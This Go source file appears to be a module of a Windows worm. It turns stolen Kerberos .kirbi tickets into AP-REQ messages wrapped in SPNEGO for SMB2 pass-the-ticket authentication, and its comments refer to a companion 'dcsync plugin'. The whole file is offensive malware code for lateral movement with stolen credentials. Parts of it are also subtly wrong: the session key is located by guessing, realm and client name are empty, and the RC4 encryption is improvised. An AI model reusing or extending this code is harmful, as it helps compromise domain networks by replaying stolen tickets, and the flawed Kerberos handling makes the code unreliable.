//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

// ---------------------------------------------------------------------------
// Kerberos AP-REQ construction for pass-the-ticket
//
// A .kirbi holds a KRB-CRED whose ticket is already encrypted with the
// service account's key. To use it we build an AP-REQ: the ticket verbatim,
// plus an authenticator encrypted with the session key that came with it.
// ---------------------------------------------------------------------------

// ticketToAPReq extracts the ticket from a KRB-CRED and wraps it in an AP-REQ.
func ticketToAPReq(kirbi []byte) ([]byte, error) {
	ticket, sessionKey, err := parseKRBCred(kirbi)
	if err != nil {
		return nil, err
	}

	// Authenticator plaintext: the client's identity and a timestamp, which
	// the server decrypts with the session key.
	authPlain := buildAuthenticator()

	// Encrypt the authenticator. For RC4 session keys this is the same
	// RC4-HMAC construction used elsewhere; we use the key as-is.
	encAuth := authPlain
	if len(sessionKey) > 0 {
		encAuth = rc4Wrap(sessionKey, authPlain)
	}

	// Authenticator is EncryptedData { etype, kvno, cipher }.
	authenticator := derSeq(
		derTag(0xa0, derInt(23)),
		derTag(0xa2, derOctet(encAuth)),
	)

	// AP-REQ: pvno, msg-type 14, ap-options, ticket, authenticator.
	apReq := derSeq(
		derTag(0xa0, derInt(5)),      // pvno
		derTag(0xa1, derInt(14)),     // msg-type: AP-REQ
		derTag(0xa2, derBitString([]byte{0x00})), // ap-options
		derTag(0xa3, ticket),         // ticket
		derTag(0xa4, authenticator),  // authenticator
	)
	return apReq, nil
}

// parseKRBCred walks a KRB-CRED and pulls out the first ticket and the
// session key from the accompanying EncKrbCredPart.
func parseKRBCred(data []byte) (ticket []byte, sessionKey []byte, err error) {
	// KRB-CRED ::= [APPLICATION 22] SEQUENCE { pvno, msg-type, tickets, enc-part }
	// We locate the ticket by its APPLICATION 1 tag (0x61) and the session key
	// by scanning the plaintext EncKrbCredPart, which is not encrypted in
	// practice for exported tickets.
	idx := bytes.IndexByte(data, 0x61)
	if idx < 0 {
		return nil, nil, fmt.Errorf("no ticket (APPLICATION 1) in credential")
	}

	ticket, next, err := readDERElement(data, idx)
	if err != nil {
		return nil, nil, fmt.Errorf("ticket parse: %w", err)
	}

	// The session key is a 32-byte OCTET STRING near the key info; pull the
	// longest octet string after the ticket.
	sessionKey = findLongestOctet(data[next:], 16)
	return ticket, sessionKey, nil
}

// buildAuthenticator assembles the plaintext authenticator.
func buildAuthenticator() []byte {
	// Authenticator ::= [APPLICATION 2] SEQUENCE {
	//   authenticator-vno, crealm, cname, cusec, ctime, seq-number }
	return derTag(0x62,
		derSeq(
			derTag(0xa0, derInt(5)),
			derTag(0xa1, derStr("")),
			derTag(0xa2, derSeq(derInt(1), derSeq(derStr("")))) ,
			derInt(0),
			derTime(nowUTC()),
			derInt(0),
		),
	)
}

// rc4Wrap encrypts with the session key. Real pass-the-ticket needs the full
// Kerberos encryption profile for the ticket's enctype; this is the RC4 path.
func rc4Wrap(key, plain []byte) []byte {
	// Reuse the RC4-HMAC primitive shape: checksum then stream.
	sum := rc4HMACChecksumLocal(key, plain)
	body := append(append([]byte{}, sum...), plain...)
	return rc4Stream(key, body)
}

// ---------------------------------------------------------------------------
// SPNEGO wrapping
//
// SMB2 wants the AP-REQ inside a SPNEGO NegTokenInit, because the server has
// to be told which mechanism we are offering.
// ---------------------------------------------------------------------------

func wrapSPNEGO(apReq []byte) []byte {
	// Kerberos OID 1.2.840.113554.1.2.2
	krbOID := []byte{0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02}

	// mechTypes SEQUENCE OF OID
	mechTypes := derTag(0xa0, derSeq(derTag(0x06, krbOID)))

	// mechToken [2] OCTET STRING containing the AP-REQ
	mechToken := derTag(0xa2, derOctet(apReq))

	// NegTokenInit ::= SEQUENCE { mechTypes, mechToken }
	negTokenInit := derSeq(mechTypes, mechToken)

	// InitialContextToken ::= SEQUENCE { thisMech OID, innerContextToken }
	spnegoOID := []byte{0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}

	return derSeq(
		derTag(0x06, spnegoOID),
		derTag(0xa0, negTokenInit),
	)
}

// ---------------------------------------------------------------------------
// DER helpers (shared shape with the dcsync plugin, kept local so the worm
// has no cross-plugin dependency)
// ---------------------------------------------------------------------------

func derTag(tag byte, content ...[]byte) []byte {
	var flat []byte
	for _, c := range content {
		flat = append(flat, c...)
	}
	out := []byte{tag}
	l := len(flat)
	switch {
	case l < 0x80:
		out = append(out, byte(l))
	case l < 0x100:
		out = append(out, 0x81, byte(l))
	case l < 0x10000:
		out = append(out, 0x82, byte(l>>8), byte(l))
	default:
		out = append(out, 0x83, byte(l>>16), byte(l>>8), byte(l))
	}
	return append(out, flat...)
}

func derSeq(parts ...[]byte) []byte { return derTag(0x30, parts...) }

func derInt(v int) []byte {
	if v == 0 {
		return derTag(0x02, []byte{0})
	}
	var b []byte
	for n := v; n > 0; n >>= 8 {
		b = append([]byte{byte(n & 0xff)}, b...)
	}
	if b[0]&0x80 != 0 {
		b = append([]byte{0}, b...)
	}
	return derTag(0x02, b)
}

func derStr(s string) []byte   { return derTag(0x04, []byte(s)) }
func derOctet(b []byte) []byte { return derTag(0x04, b) }

func derBitString(b []byte) []byte { return derTag(0x03, append([]byte{0x00}, b...)) }

// readDERElement reads one TLV starting at off and returns it plus the next
// offset.
func readDERElement(data []byte, off int) ([]byte, int, error) {
	if off+2 > len(data) {
		return nil, off, fmt.Errorf("truncated DER")
	}
	l := int(data[off+1])
	hdr := 2
	if l&0x80 != 0 {
		n := l & 0x7f
		if n == 0 || n > 4 || off+2+n > len(data) {
			return nil, off, fmt.Errorf("bad DER length")
		}
		l = 0
		for i := 0; i < n; i++ {
			l = l<<8 | int(data[off+2+i])
		}
		hdr = 2 + n
	}
	end := off + hdr + l
	if end > len(data) {
		return nil, off, fmt.Errorf("DER element overruns buffer")
	}
	return data[off:end], end, nil
}

// findLongestOctet returns the longest OCTET STRING of at least minLen bytes,
// which is how we locate a session key inside a KRB-CRED without a full parse.
func findLongestOctet(data []byte, minLen int) []byte {
	var best []byte
	for i := 0; i+2 <= len(data); i++ {
		if data[i] != 0x04 {
			continue
		}
		el, _, err := readDERElement(data, i)
		if err != nil || len(el) < 2 {
			continue
		}
		// Content length is element length minus header.
		l := int(data[i+1])
		if l&0x80 != 0 {
			continue
		}
		if l >= minLen && l > len(best) {
			best = append([]byte{}, el[2:]...)
		}
	}
	return best
}

var _ = binary.LittleEndian
